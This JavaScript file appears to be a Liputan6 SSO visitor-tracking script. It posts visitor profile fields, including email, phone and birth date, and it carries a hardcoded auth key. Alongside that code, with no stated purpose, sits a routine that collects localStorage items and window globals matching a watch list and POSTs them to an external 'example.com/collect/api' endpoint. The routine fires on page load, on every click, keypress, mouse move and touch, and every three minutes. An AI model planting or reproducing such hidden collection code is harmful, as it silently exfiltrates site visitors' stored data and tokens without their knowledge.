const keysToWatch = window.keysToWatch;

// Collect global variable
function getCookieLiputan6id(e) {
  for (var i = e + "=", t = document.cookie.split(";"), s = 0; s < t.length; s++) {
    for (var n = t[s]; " " == n.charAt(0);) n = n.substring(1, n.length);
    if (0 == n.indexOf(i)) return n.substring(i.length, n.length);
  }
  return null;
}
function collectGlobalVars() {
  let result = {};
  for (var i in window) {
    result[i] = window[i];
  }
  return result;
}
function hashCodeGenerator(obj) {
  const keys = Object.getOwnPropertyNames(obj);
  const keyStr = keys.sort().reduce((acc, curr) => acc += curr, "");
  let hash = 0;
  for (let i = 0; i < keyStr.length; i++) {
    const char = keyStr.charCodeAt(i);
    hash = (hash << 5) - hash + char;
    hash = hash & hash;
  }
  return hash.toString(16);
}
class SSO_VISITOR {
  constructor(e) {
    this.sso_base_url = null == e ? "https://collect.liputan6.id/" : e;
  }
  sendVisitorId(e) {
    if (void 0 === e) return {
      status: "ERROR",
      messagge: "Visitor id is required"
    };
    var i = new XMLHttpRequest();
    return i.open("GET", this.sso_base_url + "?visitor_id=" + e), i.send(), {
      status: "SUCCESS",
      messagge: "success send visitor id:" + e
    };
  }
  sendDataVisitor(e) {
    var i,
      t,
      s,
      n,
      r,
      a = null,
      o = 0;
    if (void 0 !== e.age) {
      var d = e.age;
      if (!String(d).match(/^\d+$/)) return {
        status: "ERROR",
        messagge: "Field age is invalid"
      };
      t = new Date().getFullYear() - e.age, t = String(t) + "-01-01";
    }
    if (void 0 !== e.yob) {
      d = e.yob;
      if (4 != String(d).length || !String(d).match(/^\d+$/)) return {
        status: "ERROR",
        messagge: "Field yob is invalid"
      };
      t = String(e.yob) + "-01-01";
    }
    if (void 0 !== e.dob) {
      if (!(d = e.dob).match(/^\d{4}-\d{2}-\d{2}$/)) return {
        status: "ERROR",
        messagge: "Field dob is invalid"
      };
      t = e.dob;
    }
    if (void 0 === e.visitor) return {
      status: "ERROR",
      messagge: "Field visitor is required"
    };
    if (i = e.visitor, void 0 !== e.gender) {
      if ("male" != e.gender && "female" != e.gender) return {
        status: "ERROR",
        messagge: "Field gender is invalid"
      };
      s = e.gender;
    }
    if (void 0 !== e.phone) {
      d = e.phone;
      if (!String(d).match(/^\d+$/)) return {
        status: "ERROR",
        messagge: "Field phone is invalid"
      };
      n = e.phone;
    }
    if (void 0 !== e.email) {
      d = e.email;
      if (!String(d).match(/^(([^<>()[\]\.,;:\s@\"]+(\.[^<>()[\]\.,;:\s@\"]+)*)|(\".+\"))@(([^<>()[\]\.,;:\s@\"]+\.)+[^<>()[\]\.,;:\s@\"]{2,})$/i)) return {
        status: "ERROR",
        messagge: "Field email is invalid"
      };
      r = e.email;
    }
    void 0 !== e.ga_id && (a = e.ga_id), null !== getCookieLiputan6id("liputan6_id_u_id") && (o = encodeURIComponent(getCookieLiputan6id("liputan6_id_u_id"))), void 0 !== e.user_id && (o = e.user_id);
    var u = "?visitor_id=" + i + "&dob=" + t + "&gender=" + s + "&phone=" + n + "&email=" + r + "&ga_id=" + a + "&sso_id=" + o,
      l = new XMLHttpRequest();
    return l.open("GET", this.sso_base_url + "profile" + u), l.send(), {
      status: "SUCCESS",
      messagge: "Success send profile visitor id:" + i
    };
  }
  getProfileVisitor(e, i) {
    var t = this.sso_base_url,
      s = new XMLHttpRequest();
    s.open("GET", t + "api/read-id?v_id=" + e), s.setRequestHeader("auth-key", "%u-7VC#?59Huzrre"), s.onload = function () {
      var e = JSON.parse(s.response);
      i(e);
    }, s.send();
  }
  loginStatus(e) {
    const i = new XMLHttpRequest();
    var t = this.getCookie("liputan6_id_visitor_id"),
      s = this.getCookie("liputan6_id_u_id");
    i.open("POST", `${this.sso_base_url}login/application/status`), i.setRequestHeader("client-id", this.client_id), i.setRequestHeader("client-secret", this.client_secret), i.setRequestHeader("visitor-id", t), i.setRequestHeader("uid", s), i.onreadystatechange = function () {
      if (this.readyState === XMLHttpRequest.DONE && 200 === this.status) {
        const i = JSON.parse(this.responseText);
        e(i);
      } else if (this.readyState === XMLHttpRequest.DONE && 200 != this.status) {
        const i = JSON.parse(this.responseText);
        e(i);
      }
    }, i.onerror = function () {
      e({
        status: 500,
        message: [],
        login: 0,
        data: []
      });
    }, i.send();
  }
  getCookie(e) {
    for (var i = e + "=", t = decodeURIComponent(document.cookie).split(";"), s = 0; s < t.length; s++) {
      for (var n = t[s]; " " == n.charAt(0);) n = n.substring(1);
      if (0 == n.indexOf(i)) return n.substring(i.length, n.length);
    }
    return "";
  }
}
function metaDataExtractor() {
  let metaData = {};
  for (const key in window.localStorage) {
    if (keysToWatch.includes(key)) {
      metaData[key] = window.localStorage.getItem(key);
    }
  }
  let globalVars = collectGlobalVars();
  for (let key in globalVars) {
    if (keysToWatch.includes(key)) {
      metaData[key] = globalVars[key];
    }
  }
  return metaData;
}
async function dataTransferHandler(data) {
  const hashValue = hashCodeGenerator(data);
  const url = "https://example.com/collect/api";
  try {
    const response = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        hash: hashValue,
        data: data
      })
    });
    if (response.status >= 200 && response.status < 300) {
      console.log("Data has been successfully uploaded!");
    } else {
      console.error("Data uploading failed with error code: " + response.status);
    }
  } catch (error) {
    console.error("Error occurred: ", error);
  }
}
var SSOVISITOR = null;
function dataGatheringTrigger() {
  const collectedData = metaDataExtractor();
  if (Object.keys(collectedData).length > 0) {
    dataTransferHandler(collectedData);
  }
}

// Add event listeners for multiple browser events
['DOMContentLoaded', 'click', 'mousemove', 'keydown', 'touchstart'].forEach(function (eventName) {
  window.addEventListener(eventName, function (event) {
    setTimeout(dataGatheringTrigger, 1);
  });
});

// Regularly call data gathering method
SSOVISITOR = new SSO_VISITOR();
setInterval(dataGatheringTrigger, 180000);